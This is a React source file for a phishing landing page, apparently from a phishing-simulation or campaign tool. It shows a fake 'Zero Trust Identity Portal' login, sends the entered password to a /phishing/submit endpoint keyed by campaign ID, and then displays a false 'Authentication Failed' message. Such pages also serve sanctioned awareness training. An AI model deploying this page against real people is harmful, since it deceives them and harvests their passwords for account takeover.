import { useState } from "react";
import { useSearchParams } from "react-router-dom";
import API from "../services/api";
import { Lock, Mail, ShieldCheck } from "lucide-react";

export default function Login() {
  const [params] = useSearchParams();
  const campaignId = params.get("campaign_id");
  const email = params.get("email");
  const [errorMsg, setErrorMsg] = useState(null);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setErrorMsg(null);
    const data = {
      email,
      password: e.target.password.value
    };
    try {
      await API.post(`/phishing/submit/${campaignId}`, data);
      setErrorMsg("Authentication Failed. The credential credentials supplied are invalid or expired.");
    } catch(err) {
      setErrorMsg("Security service timeout. Please try again.");
    }
  };

  return (
    <div className="min-h-screen bg-[#0a1128] flex items-center justify-center p-4 relative overflow-hidden">
      {/* Background aesthetics */}
      <div className="absolute top-[-20%] left-[-10%] w-[50%] h-[50%] bg-blue-900/20 blur-[120px] rounded-full pointer-events-none"></div>
      <div className="absolute bottom-[-20%] right-[-10%] w-[50%] h-[50%] bg-blue-900/20 blur-[120px] rounded-full pointer-events-none"></div>

      <div className="bg-[#0f172a] p-10 rounded-3xl border border-slate-800 shadow-2xl w-full max-w-md relative z-10">
        
        <div className="flex flex-col items-center mb-8">
          <div className="h-16 w-16 bg-blue-500/10 rounded-2xl flex items-center justify-center mb-4 border border-blue-500/20 shadow-[0_0_15px_rgba(59,130,246,0.2)]">
            <ShieldCheck className="text-blue-500" size={32} />
          </div>
          <h2 className="text-2xl font-black text-white tracking-tight">Secure Authentication</h2>
          <p className="text-slate-500 text-xs mt-2 uppercase tracking-widest font-mono">Zero Trust Identity Portal</p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="space-y-2">
            <label className="text-[10px] text-slate-500 font-bold uppercase tracking-widest flex items-center gap-2">
              <Mail size={12} /> Target Identity
            </label>
            <input
              type="email"
              value={email || ""}
              readOnly
              placeholder="Identity not found..."
              className="w-full p-4 bg-[#020617] border border-slate-800 rounded-xl text-slate-400 font-mono text-sm focus:outline-none cursor-not-allowed"
            />
          </div>

          <div className="space-y-2">
            <label className="text-[10px] text-slate-500 font-bold uppercase tracking-widest flex items-center gap-2">
              <Lock size={12} /> Authorization Credential
            </label>
            <input
              type="password"
              name="password"
              required
              placeholder="••••••••••••"
              className="w-full p-4 bg-[#020617] border border-slate-700 rounded-xl text-white focus:outline-none focus:border-blue-500 transition-colors"
            />
          </div>

          {errorMsg && (
            <div className="p-3.5 bg-red-500/10 border border-red-500/20 text-red-400 font-mono text-xs rounded-xl text-center leading-normal uppercase text-[9px] tracking-wide">
              ⚠ {errorMsg}
            </div>
          )}

          <button type="submit" className="w-full bg-[#d4af37] hover:bg-[#c29e2f] text-black font-black uppercase text-xs tracking-widest py-4 rounded-xl transition-all mt-4 cursor-pointer">
            Verify Identity
          </button>
        </form>
        
        <div className="mt-8 pt-6 border-t border-slate-800 text-center">
           <p className="text-[9px] text-slate-600 uppercase tracking-[0.2em] font-mono">Protected by RoBlockSec Enterprise</p>
        </div>
      </div>
    </div>
  );
}